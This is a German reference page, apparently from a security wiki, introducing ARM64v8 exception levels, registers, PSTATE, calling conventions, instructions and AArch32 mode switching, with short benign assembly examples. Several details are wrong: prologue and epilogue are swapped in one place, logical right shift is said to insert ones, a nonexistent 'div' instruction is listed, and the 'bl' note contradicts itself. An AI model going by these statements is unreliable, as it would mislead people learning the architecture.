# Einführung in ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Exception Levels - EL (ARM64v8)**

In der ARMv8-Architektur definieren die als Exception Levels (ELs) bezeichneten Ausführungslevel die Berechtigungsstufe und die Fähigkeiten der Ausführungsumgebung. Es gibt vier Exception Levels, von EL0 bis EL3, die jeweils einem unterschiedlichen Zweck dienen:

1. **EL0 - User Mode**:
- Dies ist die am wenigsten privilegierte Ebene und wird zur Ausführung regulären Anwendungscodes verwendet.
- Anwendungen, die auf EL0 ausgeführt werden, sind voneinander und von der Systemsoftware isoliert, was Sicherheit und Stabilität verbessert.
2. **EL1 - Operating System Kernel Mode**:
- Die meisten Betriebssystemkerne laufen auf dieser Ebene.
- EL1 verfügt über mehr Berechtigungen als EL0 und kann auf Systemressourcen zugreifen, jedoch mit einigen Einschränkungen zur Gewährleistung der Systemintegrität. Der Wechsel von EL0 zu EL1 erfolgt mit der SVC-Instruktion.
3. **EL2 - Hypervisor Mode**:
- Diese Ebene wird für Virtualisierung verwendet. Ein auf EL2 laufender Hypervisor kann mehrere Betriebssysteme (jeweils in einem eigenen EL1) verwalten, die auf derselben physischen Hardware laufen.
- EL2 stellt Funktionen zur Isolation und Kontrolle der virtualisierten Umgebungen bereit.
- Daher können Virtual-Machine-Anwendungen wie Parallels das `hypervisor.framework` verwenden, um mit EL2 zu interagieren und virtuelle Maschinen ohne Kernel Extensions auszuführen.
- Für den Wechsel von EL1 zu EL2 wird die `HVC`-Instruktion verwendet.
4. **EL3 - Secure Monitor Mode**:
- Dies ist die am stärksten privilegierte Ebene und wird häufig für Secure Boot und Trusted Execution Environments verwendet.
- EL3 kann Zugriffe zwischen sicheren und nicht sicheren Zuständen verwalten und kontrollieren (z. B. Secure Boot, Trusted OS usw.).
- Es wurde für KPP (Kernel Patch Protection) in macOS verwendet, wird aber nicht mehr eingesetzt.
- EL3 wird von Apple nicht mehr verwendet.
- Der Übergang zu EL3 erfolgt typischerweise mit der `SMC`-Instruktion (Secure Monitor Call).

Die Verwendung dieser Ebenen ermöglicht eine strukturierte und sichere Verwaltung verschiedener Systemaspekte – von Benutzeranwendungen bis hin zur am stärksten privilegierten Systemsoftware. Der Ansatz von ARMv8 bezüglich der Berechtigungsstufen hilft dabei, verschiedene Systemkomponenten effektiv zu isolieren und dadurch die Sicherheit und Robustheit des Systems zu erhöhen.

## **Registers (ARM64v8)**

ARM64 verfügt über **31 General-Purpose-Register**, die mit `x0` bis `x30` bezeichnet werden. Jedes kann einen **64-Bit**- (8-Byte-)Wert speichern. Für Operationen, die nur 32-Bit-Werte benötigen, kann auf dieselben Register im 32-Bit-Modus über die Namen w0 bis w30 zugegriffen werden.

1. **`x0`** bis **`x7`** - Diese werden typischerweise als Scratch-Register und zur Übergabe von Parametern an Subroutinen verwendet.
- **`x0`** enthält außerdem die Rückgabedaten einer Funktion
2. **`x8`** - Im Linux-Kernel wird `x8` als System-Call-Nummer für die `svc`-Instruktion verwendet. **In macOS wird dafür x16 verwendet!**
3. **`x9`** bis **`x15`** - Weitere temporäre Register, die häufig für lokale Variablen verwendet werden.
4. **`x16`** und **`x17`** - **Intra-procedural Call Registers**. Temporäre Register für unmittelbare Werte. Sie werden außerdem für indirekte Funktionsaufrufe und PLT- (Procedure Linkage Table-)Stubs verwendet.
- **`x16`** wird in **macOS** als **System-Call-Nummer** für die **`svc`**-Instruktion verwendet.
5. **`x18`** - **Platform Register**. Es kann als General-Purpose-Register verwendet werden, ist auf einigen Plattformen jedoch für plattformspezifische Zwecke reserviert: als Pointer auf den Thread Environment Block des aktuellen Threads in Windows oder als Pointer auf die aktuell **ausgeführte Task-Struktur im Linux-Kernel**.
6. **`x19`** bis **`x28`** - Dies sind Callee-Saved-Register. Eine Funktion muss die Werte dieser Register für ihren Aufrufer erhalten. Daher werden sie auf dem Stack gespeichert und vor der Rückkehr zum Aufrufer wiederhergestellt.
7. **`x29`** - **Frame Pointer**, der zur Nachverfolgung des Stack Frames dient. Wenn durch einen Funktionsaufruf ein neuer Stack Frame erstellt wird, wird das **`x29`**-Register auf dem **Stack gespeichert** und die Adresse des **neuen** Frame Pointers (die Adresse von **`sp`**) in diesem Register gespeichert.
- Dieses Register kann auch als **General-Purpose-Register** verwendet werden, wird aber normalerweise als Referenz auf **lokale Variablen** eingesetzt.
8. **`x30`** oder **`lr`** - **Link Register**. Es enthält die **Rücksprungadresse**, wenn eine `BL`- (Branch with Link) oder `BLR`-Instruktion (Branch with Link to Register) ausgeführt wird, indem der **`pc`**-Wert in diesem Register gespeichert wird.
- Es kann auch wie jedes andere Register verwendet werden.
- Wenn die aktuelle Funktion eine neue Funktion aufrufen wird und dadurch `lr` überschreibt, speichert sie es am Anfang auf dem Stack. Dies ist der Epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp` und `lr` speichern, Platz reservieren und neuen `fp` setzen) und stellt es am Ende wieder her. Dies ist der Prologue (`ldp x29, x30, [sp], #48; ret` -> `fp` und `lr` wiederherstellen und zurückkehren).
9. **`sp`** - **Stack Pointer**, der zur Nachverfolgung der Stack-Oberkante verwendet wird.
- Der Wert von **`sp`** muss immer mindestens an einem **Quadword** ausgerichtet sein, andernfalls kann eine Alignment Exception auftreten.
10. **`pc`** - **Program Counter**, der auf die nächste Instruktion zeigt. Dieses Register kann nur durch Exception-Erzeugungen, Exception-Rückgaben und Branches aktualisiert werden. Die einzigen gewöhnlichen Instruktionen, die dieses Register lesen können, sind Branch-with-Link-Instruktionen (BL, BLR), um die **`pc`**-Adresse in **`lr`** (Link Register) zu speichern.
11. **`xzr`** - **Zero Register**. In seiner **32**-Bit-Registerform wird es auch **`wzr`** genannt. Es kann verwendet werden, um einfach den Wert Null zu erhalten (eine häufige Operation) oder um Vergleiche mit **`subs`** durchzuführen, etwa `subs XZR, Xn, #10`, wobei die resultierenden Daten nirgendwo gespeichert werden (im **`xzr`**).

Die **`Wn`**-Register sind die **32-Bit**-Version der **`Xn`**-Register.

> [!TIP]
> Die Register X0 bis X18 sind volatil, was bedeutet, dass ihre Werte durch Funktionsaufrufe und Interrupts verändert werden können. Die Register X19 bis X28 sind dagegen nicht volatil, was bedeutet, dass ihre Werte über Funktionsaufrufe hinweg erhalten bleiben müssen ("callee saved").

### SIMD and Floating-Point Registers

Darüber hinaus gibt es weitere **32 Register mit einer Länge von 128 Bit**, die für optimierte Single-Instruction-Multiple-Data- (SIMD-)Operationen und zur Durchführung von Floating-Point-Arithmetik verwendet werden können. Diese werden Vn-Register genannt, können jedoch auch mit **64**-Bit-, **32**-Bit-, **16**-Bit- und **8**-Bit-Werten arbeiten und heißen dann **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** und **`Bn`**.

### System Registers

**Es gibt Hunderte von Systemregistern**, die auch Special-Purpose-Register (SPRs) genannt werden. Sie werden zur **Überwachung** und **Steuerung** des Verhaltens von **Prozessoren** verwendet.\
Sie können nur mit den dedizierten speziellen Instruktionen **`mrs`** und **`msr`** gelesen oder gesetzt werden.

Die speziellen Register **`TPIDR_EL0`** und **`TPIDDR_EL0`** werden häufig beim Reverse Engineering gefunden. Das Suffix `EL0` gibt die **minimale Exception-Ebene** an, von der aus auf das Register zugegriffen werden kann (in diesem Fall ist EL0 die reguläre Exception- (Berechtigungs-)Ebene, mit der reguläre Programme ausgeführt werden).\
Sie werden häufig verwendet, um die **Basisadresse der Thread-Local-Storage**-Speicherregion zu speichern. Normalerweise ist das erste Register für Programme, die auf EL0 laufen, les- und schreibbar, während das zweite von EL0 gelesen und von EL1 (z. B. dem Kernel) geschrieben werden kann.

- `mrs x0, TPIDR_EL0 ; TPIDR_EL0 in x0 lesen`
- `msr TPIDR_EL0, X0 ; x0 in TPIDR_EL0 schreiben`

### **PSTATE**

**PSTATE** enthält mehrere Prozesskomponenten, die in das für das Betriebssystem sichtbare spezielle Register **`SPSR_ELx`** serialisiert werden, wobei X die **Berechtigungsstufe** der ausgelösten Exception bezeichnet (dadurch kann der Prozesszustand nach Ende der Exception wiederhergestellt werden).\
Dies sind die zugänglichen Felder:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Die **`N`**-, **`Z`**-, **`C`**- und **`V`**-Condition-Flags:
- **`N`** bedeutet, dass die Operation ein negatives Ergebnis geliefert hat
- **`Z`** bedeutet, dass die Operation den Wert Null geliefert hat
- **`C`** bedeutet, dass die Operation einen Carry erzeugt hat
- **`V`** bedeutet, dass die Operation einen vorzeichenbehafteten Overflow erzeugt hat:
- Die Summe zweier positiver Zahlen ergibt ein negatives Ergebnis.
- Die Summe zweier negativer Zahlen ergibt ein positives Ergebnis.
- Bei einer Subtraktion, wenn eine große negative Zahl von einer kleineren positiven Zahl (oder umgekehrt) subtrahiert wird und das Ergebnis nicht innerhalb des Wertebereichs der angegebenen Bitgröße dargestellt werden kann.
- Der Prozessor weiß natürlich nicht, ob die Operation vorzeichenbehaftet ist oder nicht. Daher prüft er bei den Operationen C und V und zeigt an, ob ein Carry aufgetreten ist, wenn die Operation vorzeichenbehaftet oder vorzeichenlos war.

> [!WARNING]
> Nicht alle Instruktionen aktualisieren diese Flags. Einige, wie **`CMP`** oder **`TST`**, tun dies, ebenso andere mit einem Suffix `s`, etwa **`ADDS`**.

- Das aktuelle **Registerbreiten-Flag (`nRW`)**: Wenn das Flag den Wert 0 enthält, läuft das Programm nach der Wiederaufnahme im AArch64-Ausführungszustand.
- Das aktuelle **Exception Level** (**`EL`**): Ein reguläres Programm, das in EL0 läuft, hat den Wert 0
- Das **Single-Stepping-Flag** (**`SS`**): Wird von Debuggern verwendet, um einzelne Schritte auszuführen, indem das SS-Flag innerhalb von **`SPSR_ELx`** über eine Exception auf 1 gesetzt wird. Das Programm führt einen Schritt aus und löst eine Single-Step-Exception aus.
- Das **Illegal-Exception-State-Flag** (**`IL`**): Es wird verwendet, um zu markieren, wenn privilegierte Software einen ungültigen Transfer zwischen Exception Levels durchführt. Dieses Flag wird auf 1 gesetzt und der Prozessor löst eine Illegal-State-Exception aus.
- Die **`DAIF`**-Flags: Diese Flags ermöglichen es einem privilegierten Programm, bestimmte externe Exceptions selektiv zu maskieren.
- Wenn **`A`** den Wert 1 hat, bedeutet dies, dass **asynchrone Aborts** ausgelöst werden. **`I`** legt fest, ob auf externe Hardware-**Interrupt Requests** (IRQs) reagiert wird, und `F` bezieht sich auf **Fast Interrupt Requests** (FIRs).
- Die Flags zur Auswahl des Stack Pointers (**`SPS`**): Privilegierte Programme, die in EL1 oder höher laufen, können zwischen der Verwendung ihres eigenen Stack-Pointer-Registers und des User-Model-Registers wechseln (z. B. zwischen `SP_EL1` und `EL0`). Dieser Wechsel wird durch Schreiben in das spezielle Register **`SPSel`** durchgeführt. Dies ist von EL0 aus nicht möglich.

## **Calling Convention (ARM64v8)**

Die ARM64 Calling Convention legt fest, dass die **ersten acht Parameter** einer Funktion in den Registern **`x0`** bis **`x7`** übergeben werden. **Zusätzliche** Parameter werden auf dem **Stack** übergeben. Der **Rückgabewert** wird im Register **`x0`** zurückgegeben oder zusätzlich in **`x1`**, **wenn er 128 Bit lang ist**. Die Register **`x19`** bis **`x30`** und **`sp`** müssen über Funktionsaufrufe hinweg **erhalten bleiben**.

Beim Lesen einer Funktion in Assembly sollte man nach dem **Function Prologue und Epilogue** suchen. Der **Prologue** umfasst normalerweise das **Speichern des Frame Pointers (`x29`)**, das **Setzen** eines **neuen Frame Pointers** und das **Reservieren von Stack-Speicher**. Der **Epilogue** umfasst normalerweise das **Wiederherstellen des gespeicherten Frame Pointers** und die **Rückkehr** aus der Funktion.

### Calling Convention in Swift

Swift hat eine eigene **Calling Convention**, die in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64) beschrieben ist.

## **Common Instructions (ARM64v8)**

ARM64-Instruktionen haben im Allgemeinen das **Format `opcode dst, src1, src2`**, wobei **`opcode`** die auszuführende **Operation** (z. B. `add`, `sub`, `mov` usw.), **`dst`** das **Zielregister**, in dem das Ergebnis gespeichert wird, und **`src1`** sowie **`src2`** die **Quellregister** sind. Anstelle von Quellregistern können auch Immediate Values verwendet werden.

- **`mov`**: Einen Wert von einem **Register** in ein anderes **verschieben**.
- Beispiel: `mov x0, x1` – Dies verschiebt den Wert von `x1` nach `x0`.
- **`ldr`**: Einen Wert aus dem **Speicher** in ein **Register laden**.
- Beispiel: `ldr x0, [x1]` – Dies lädt einen Wert aus der von `x1` referenzierten Speicheradresse nach `x0`.
- **Offset-Modus**: Ein Offset, der den ursprünglichen Pointer beeinflusst, wird beispielsweise so angegeben:
- `ldr x2, [x1, #8]`, dies lädt den Wert von x1 + 8 nach x2
- `ldr x2, [x0, x1, lsl #2]`, dies lädt ein Objekt aus dem Array x0 an der Position x1 (Index) \* 4 nach x2
- **Pre-Indexed-Modus**: Berechnungen werden auf den Ursprung angewendet, das Ergebnis abgerufen und der neue Ursprung ebenfalls im Ursprung gespeichert.
- `ldr x2, [x1, #8]!`, dies lädt `x1 + 8` nach `x2` und speichert das Ergebnis von `x1 + 8` in x1
- `str lr, [sp, #-4]!`, das Link Register in sp speichern und das Register sp aktualisieren
- **Post-Indexed-Modus**: Dies funktioniert wie der vorherige Modus, aber die Speicheradresse wird zuerst verwendet und anschließend wird der Offset berechnet und gespeichert.
- `ldr x0, [x1], #8`, x1 nach x0 laden und x1 mit `x1 + 8` aktualisieren
- **PC-relative Adressierung**: In diesem Fall wird die zu ladende Adresse relativ zum PC-Register berechnet
- `ldr x1, =_start`, dies lädt die Adresse, an der das Symbol `_start` beginnt, relativ zum aktuellen PC nach x1.
- **`str`**: Einen Wert aus einem **Register** in den **Speicher schreiben**.
- Beispiel: `str x0, [x1]` – Dies speichert den Wert in `x0` an der von `x1` referenzierten Speicheradresse.
- **`ldp`**: **Load Pair of Registers**. Diese Instruktion **lädt zwei Register** aus **aufeinanderfolgenden Speicheradressen**. Die Speicheradresse wird normalerweise gebildet, indem ein Offset zum Wert eines anderen Registers addiert wird.
- Beispiel: `ldp x0, x1, [x2]` – Dies lädt `x0` und `x1` aus den Speicheradressen `x2` bzw. `x2 + 8`.
- **`stp`**: **Store Pair of Registers**. Diese Instruktion **speichert zwei Register** an **aufeinanderfolgenden Speicheradressen**. Die Speicheradresse wird normalerweise gebildet, indem ein Offset zum Wert eines anderen Registers addiert wird.
- Beispiel: `stp x0, x1, [sp]` – Dies speichert `x0` und `x1` an den Speicheradressen `sp` bzw. `sp + 8`.
- `stp x0, x1, [sp, #16]!` – Dies speichert `x0` und `x1` an den Speicheradressen `sp+16` bzw. `sp + 24` und aktualisiert `sp` mit `sp+16`.
- **`add`**: Die Werte zweier Register **addieren** und das Ergebnis in einem Register speichern.
- Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Ziel
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (Register oder Immediate)
- \[shift #N | RRX] -> Einen Shift durchführen oder RRX aufrufen
- Beispiel: `add x0, x1, x2` – Dies addiert die Werte in `x1` und `x2` und speichert das Ergebnis in `x0`.
- `add x5, x5, #1, lsl #12` – Dies entspricht 4096 (eine 1, die 12-mal geshiftet wird) -> 1 0000 0000 0000 0000
- **`adds`** führt ein `add` aus und aktualisiert die Flags
- **`sub`**: Die Werte zweier Register **subtrahieren** und das Ergebnis in einem Register speichern.
- Siehe **Syntax von `add`**.
- Beispiel: `sub x0, x1, x2` – Dies subtrahiert den Wert in `x2` von `x1` und speichert das Ergebnis in `x0`.
- **`subs`** funktioniert wie `sub`, aktualisiert aber die Flags
- **`mul`**: Die Werte von **zwei Registern** **multiplizieren** und das Ergebnis in einem Register speichern.
- Beispiel: `mul x0, x1, x2` – Dies multipliziert die Werte in `x1` und `x2` und speichert das Ergebnis in `x0`.
- **`div`**: Den Wert eines Registers durch ein anderes teilen und das Ergebnis in einem Register speichern.
- Beispiel: `div x0, x1, x2` – Dies teilt den Wert in `x1` durch `x2` und speichert das Ergebnis in `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logischer Left Shift**: Nullen am Ende hinzufügen und die anderen Bits nach vorne verschieben (Multiplikation mit n-mal 2)
- **Logischer Right Shift**: Einsen am Anfang hinzufügen und die anderen Bits nach hinten verschieben (Division durch n-mal 2 ohne Vorzeichen)
- **Arithmetischer Right Shift**: Wie **`lsr`**, aber anstatt Nullen hinzuzufügen, werden Einsen ergänzt, wenn das höchstwertige Bit 1 ist (Division durch n-mal 2 mit Vorzeichen)
- **Right Rotate**: Wie **`lsr`**, aber alles, was rechts entfernt wird, wird links angefügt
- **Rotate Right with Extend**: Wie **`ror`**, aber mit dem Carry-Flag als „höchstwertigem Bit“. Das Carry-Flag wird zu Bit 31 verschoben und das entfernte Bit in das Carry-Flag.
- **`bfm`**: **Bit Field Move**. Diese Operationen **kopieren Bits `0...n`** aus einem Wert und platzieren sie an den Positionen **`m..m+n`**. **`#s`** gibt die Position des **linken Bits** und **`#r`** die Rechtsrotationsmenge an.
- Bitfield Move: `BFM Xd, Xn, #r`
- Signed Bitfield Move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield Move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Ein Bitfield aus einem Register kopieren und in ein anderes Register kopieren.
- **`BFI X1, X2, #3, #4`** Fügt 4 Bits aus X2 ab dem 3. Bit von X1 ein
- **`BFXIL X1, X2, #3, #4`** Extrahiert vier Bits ab dem 3. Bit aus X2 und kopiert sie nach X1
- **`SBFIZ X1, X2, #3, #4`** Erweitert 4 Bits aus X2 mit Vorzeichen und fügt sie ab Bitposition 3 in X1 ein, wobei die rechten Bits auf Null gesetzt werden
- **`SBFX X1, X2, #3, #4`** Extrahiert 4 Bits ab Bit 3 aus X2, erweitert sie mit Vorzeichen und platziert das Ergebnis in X1
- **`UBFIZ X1, X2, #3, #4`** Erweitert 4 Bits aus X2 ohne Vorzeichen und fügt sie ab Bitposition 3 in X1 ein, wobei die rechten Bits auf Null gesetzt werden
- **`UBFX X1, X2, #3, #4`** Extrahiert 4 Bits ab Bit 3 aus X2 und platziert das ohne Vorzeichen erweiterte Ergebnis in X1.
- **Sign Extend To X:** Das Vorzeichen (oder in der vorzeichenlosen Version nur Nullen) eines Wertes erweitern, um Operationen damit durchführen zu können:
- **`SXTB X1, W2`** Erweitert das Vorzeichen eines Bytes **von W2 nach X1** (`W2` ist die Hälfte von `X2`), um die 64 Bit aufzufüllen
- **`SXTH X1, W2`** Erweitert das Vorzeichen einer 16-Bit-Zahl **von W2 nach X1**, um die 64 Bit aufzufüllen
- **`SXTW X1, W2`** Erweitert das Vorzeichen eines Bytes **von W2 nach X1**, um die 64 Bit aufzufüllen
- **`UXTB X1, W2`** Fügt einem Byte **von W2 nach X1** Nullen (vorzeichenlos) hinzu, um die 64 Bit aufzufüllen
- **`extr`:** Extrahiert Bits aus einem angegebenen **Paar verketteter Register**.
- Beispiel: `EXTR W3, W2, W1, #3` Dies **verkettet W1+W2** und nimmt **von Bit 3 von W2 bis Bit 3 von W1**, um das Ergebnis in W3 zu speichern.
- **`cmp`**: **Zwei Register vergleichen** und Condition Flags setzen. Dies ist ein **Alias für `subs`**, bei dem das Zielregister auf das Zero Register gesetzt wird. Nützlich, um zu prüfen, ob `m == n`.
- Es unterstützt **dieselbe Syntax wie `subs`**
- Beispiel: `cmp x0, x1` – Dies vergleicht die Werte in `x0` und `x1` und setzt die Condition Flags entsprechend.
- **`cmn`**: **Negativen Operanden vergleichen**. Dies ist ein **Alias für `adds`** und unterstützt dieselbe Syntax. Nützlich, um zu prüfen, ob `m == -n`.
- **`ccmp`**: Bedingter Vergleich. Der Vergleich wird nur durchgeführt, wenn ein vorheriger Vergleich wahr war, und setzt gezielt die NZCV-Bits.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> Wenn x1 != x2 und x3 < x4, zu func springen
- Dies liegt daran, dass **`ccmp`** nur ausgeführt wird, wenn der vorherige **`cmp` ein `NE`** war. Falls nicht, werden die Bits `nzcv` auf 0 gesetzt (wodurch der Vergleich `blt` nicht erfüllt wird).
- Dies kann auch als `ccmn` verwendet werden (gleich, aber negativ, wie `cmp` im Vergleich zu `cmn`).
- **`tst`**: Es prüft, ob mindestens ein Wert des Vergleichs in beiden Operanden 1 ist (es funktioniert wie ein ANDS, ohne das Ergebnis irgendwo zu speichern). Dies ist nützlich, um ein Register mit einem Wert zu prüfen und festzustellen, ob eines der im Wert angegebenen Bits des Registers 1 ist.
- Beispiel: `tst X1, #7` Prüft, ob eines der letzten 3 Bits von X1 1 ist
- **`teq`**: XOR-Operation, bei der das Ergebnis verworfen wird
- **`b`**: Unbedingter Branch
- Beispiel: `b myFunction`
- Beachte, dass dadurch das Link Register nicht mit der Rücksprungadresse gefüllt wird (nicht für Subroutine-Aufrufe geeignet, die zurückkehren müssen)
- **`bl`**: **Branch** with Link, wird zum **Aufrufen** einer **Subroutine** verwendet. Speichert die **Rücksprungadresse in `x30`**.
- Beispiel: `bl myFunction` – Dies ruft die Funktion `myFunction` auf und speichert die Rücksprungadresse in `x30`.
- Beachte, dass dadurch das Link Register nicht mit der Rücksprungadresse gefüllt wird (nicht für Subroutine-Aufrufe geeignet, die zurückkehren müssen)
- **`blr`**: **Branch** with Link to Register, wird zum **Aufrufen** einer **Subroutine** verwendet, deren Ziel in einem **Register** angegeben ist. Speichert die Rücksprungadresse in `x30`. (Dies ist
- Beispiel: `blr x1` – Dies ruft die Funktion auf, deren Adresse in `x1` enthalten ist, und speichert die Rücksprungadresse in `x30`.
- **`ret`**: Aus einer **Subroutine zurückkehren**, typischerweise unter Verwendung der Adresse in **`x30`**.
- Beispiel: `ret` – Dies kehrt unter Verwendung der Rücksprungadresse in `x30` aus der aktuellen Subroutine zurück.
- **`b.<cond>`**: Bedingte Branches
- **`b.eq`**: **Branch bei Gleichheit**, basierend auf der vorherigen `cmp`-Instruktion.
- Beispiel: `b.eq label` – Wenn die vorherige `cmp`-Instruktion zwei gleiche Werte festgestellt hat, wird zu `label` gesprungen.
- **`b.ne`**: **Branch bei Ungleichheit**. Diese Instruktion prüft die Condition Flags (die durch eine vorherige Vergleichsinstruktion gesetzt wurden) und springt zu einem Label oder einer Adresse, wenn die verglichenen Werte nicht gleich waren.
- Beispiel: Nach einer `cmp x0, x1`-Instruktion bedeutet `b.ne label`: Wenn die Werte in `x0` und `x1` nicht gleich waren, wird zu `label` gesprungen.
- **`cbz`**: **Compare and Branch on Zero**. Diese Instruktion vergleicht ein Register mit Null und springt zu einem Label oder einer Adresse, wenn sie gleich sind.
- Beispiel: `cbz x0, label` – Wenn der Wert in `x0` Null ist, wird zu `label` gesprungen.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Diese Instruktion vergleicht ein Register mit Null und springt zu einem Label oder einer Adresse, wenn sie nicht gleich sind.
- Beispiel: `cbnz x0, label` – Wenn der Wert in `x0` nicht Null ist, wird zu `label` gesprungen.
- **`tbnz`**: Bit testen und bei einem Wert ungleich Null springen
- Beispiel: `tbnz x0, #8, label`
- **`tbz`**: Bit testen und bei Null springen
- Beispiel: `tbz x0, #8, label`
- **Bedingte Select-Operationen**: Dies sind Operationen, deren Verhalten von den Condition Bits abhängt.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Wenn wahr, X0 = X1, wenn falsch, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Wenn wahr, Xd = Xn, wenn falsch, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Wenn wahr, Xd = Xn + 1, wenn falsch, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Wenn wahr, Xd = Xn, wenn falsch, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Wenn wahr, Xd = NOT(Xn), wenn falsch, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Wenn wahr, Xd = Xn, wenn falsch, Xd = - Xm
- `cneg Xd, Xn, cond` -> Wenn wahr, Xd = - Xn, wenn falsch, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Wenn wahr, Xd = 1, wenn falsch, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Wenn wahr, Xd = \<alle 1>, wenn falsch, Xd = 0
- **`adrp`**: Die **Page-Adresse eines Symbols berechnen** und in einem Register speichern.
- Beispiel: `adrp x0, symbol` – Dies berechnet die Page-Adresse von `symbol` und speichert sie in `x0`.
- **`ldrsw`**: Einen vorzeichenbehafteten **32-Bit**-Wert aus dem Speicher **laden** und auf **64 Bit** vorzeichenerweitern. Dies wird für häufige SWITCH-Fälle verwendet.
- Beispiel: `ldrsw x0, [x1]` – Dies lädt einen vorzeichenbehafteten 32-Bit-Wert aus der von `x1` referenzierten Speicheradresse, erweitert ihn auf 64 Bit mit Vorzeichen und speichert ihn in `x0`.
- **`stur`**: Einen Registerwert unter Verwendung eines Offsets von einem anderen Register an einer Speicheradresse **speichern**.
- Beispiel: `stur x0, [x1, #4]` – Dies speichert den Wert in `x0` an der Speicheradresse, die 4 Bytes größer ist als die aktuell in `x1` enthaltene Adresse.
- **`svc`**: Einen **System Call** ausführen. Dies steht für „Supervisor Call“. Wenn der Prozessor diese Instruktion ausführt, **wechselt er vom User Mode in den Kernel Mode** und springt zu einer bestimmten Speicheradresse, an der sich der Code zur **Behandlung von System Calls durch den Kernel** befindet.

- Beispiel:

```armasm
mov x8, 93  ; Die System-Call-Nummer für exit (93) in Register x8 laden.
mov x0, 0   ; Den Exit-Statuscode (0) in Register x0 laden.
svc 0       ; Den System Call ausführen.
```

### **Function Prologue**

1. **Das Link Register und den Frame Pointer auf dem Stack speichern**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Den neuen Frame Pointer einrichten**: `mov x29, sp` (richtet den neuen Frame Pointer für die aktuelle Funktion ein)
3. **Auf dem Stack Speicherplatz für lokale Variablen reservieren** (falls erforderlich): `sub sp, sp, <size>` (wobei `<size>` der benötigten Anzahl an Bytes entspricht)

### **Funktions-Epilog**

1. **Lokale Variablen freigeben (falls welche reserviert wurden)**: `add sp, sp, <size>`
2. **Das Link-Register und den Frame Pointer wiederherstellen**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (gibt die Kontrolle mithilfe der Adresse im Link-Register an den Aufrufer zurück)

## Allgemeine ARM-Speicherschutzmechanismen

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32-Ausführungszustand

Armv8-A unterstützt die Ausführung von 32-Bit-Programmen. **AArch32** kann in einem von **zwei Instruction Sets** ausgeführt werden: **`A32`** und **`T32`**, und kann über **`interworking`** zwischen ihnen wechseln.\
**Privilegierte** 64-Bit-Programme können die **Ausführung von 32-Bit**-Programmen planen, indem sie einen Exception-Level-Transfer zum niedriger privilegierten 32-Bit-Modus ausführen.\
Beachte, dass der Übergang von 64-Bit zu 32-Bit mit einer Verringerung des Exception Levels erfolgt (zum Beispiel, wenn ein 64-Bit-Programm in EL1 ein Programm in EL0 startet). Dies geschieht, indem **Bit 4 von** **`SPSR_ELx`** im speziellen Register **auf 1 gesetzt wird**, sobald der **AArch32**-Prozess-Thread zur Ausführung bereit ist, während der Rest von `SPSR_ELx` das CPSR des **`AArch32`**-Programms speichert. Anschließend ruft der privilegierte Prozess die **`ERET`**-Instruktion auf, woraufhin der Prozessor zu **`AArch32`** wechselt und abhängig vom CPSR in A32 oder T32 eintritt**.**

Das **`interworking`** erfolgt über die J- und T-Bits des CPSR. `J=0` und `T=0` bedeuten **`A32`**, während `J=0` und `T=1` **T32** bedeuten. Dies bedeutet im Wesentlichen, dass das **niedrigste Bit auf 1 gesetzt wird**, um anzuzeigen, dass das Instruction Set T32 ist.\
Dies wird während der **`interworking`-Branch-Instruktionen** festgelegt, kann aber auch direkt mit anderen Instruktionen gesetzt werden, wenn der PC als Zielregister verwendet wird. Beispiel:

Ein weiteres Beispiel:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Register

Es gibt 16 32-Bit-Register (r0-r15). **Von r0 bis r14** können sie für **jede Operation** verwendet werden, einige sind jedoch normalerweise reserviert:

- **`r15`**: Program Counter (immer). Enthält die Adresse der nächsten Instruktion. In A32: current + 8, in T32: current + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Intra-procedural Call Register
- **`r13`**: Stack Pointer (Beachte, dass der Stack immer 16-Byte-aligned ist)
- **`r14`**: Link Register

Außerdem werden Register in **`banked registries`** gesichert. Dabei handelt es sich um Speicherorte, an denen die Registerwerte gespeichert werden, um **schnelle context switching** bei der Exception-Behandlung und bei privilegierten Operationen zu ermöglichen. Dadurch müssen Register nicht jedes Mal manuell gespeichert und wiederhergestellt werden.\
Dies geschieht durch **Speichern des Processor State vom `CPSR` im `SPSR`** des Prozessormodus, in den die Exception wechselt. Bei der Rückkehr von der Exception wird der **`CPSR` aus dem `SPSR`** wiederhergestellt.

### CPSR - Current Program Status Register

In AArch32 funktioniert der CPSR ähnlich wie **`PSTATE`** in AArch64 und wird ebenfalls in **`SPSR_ELx`** gespeichert, wenn eine Exception ausgelöst wird, um die Ausführung später wiederherzustellen:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Die Felder sind in mehrere Gruppen unterteilt:

- Application Program Status Register (APSR): Arithmetic Flags, die von EL0 aus zugänglich sind
